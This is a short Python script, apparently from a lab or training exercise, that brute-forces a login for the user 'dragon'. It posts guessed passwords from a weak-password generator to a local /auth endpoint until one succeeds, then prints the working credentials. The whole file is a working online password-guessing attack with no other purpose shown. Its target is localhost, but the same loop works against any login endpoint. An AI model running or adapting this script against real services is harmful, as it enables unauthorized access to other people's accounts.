import requests
from pass_gens import bad_pass_gen


login = 'dragon'
success = False
while not success:
    password = next(bad_pass_gen)
    data = {'login': login, 'password': password}

    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print(data)
        success = True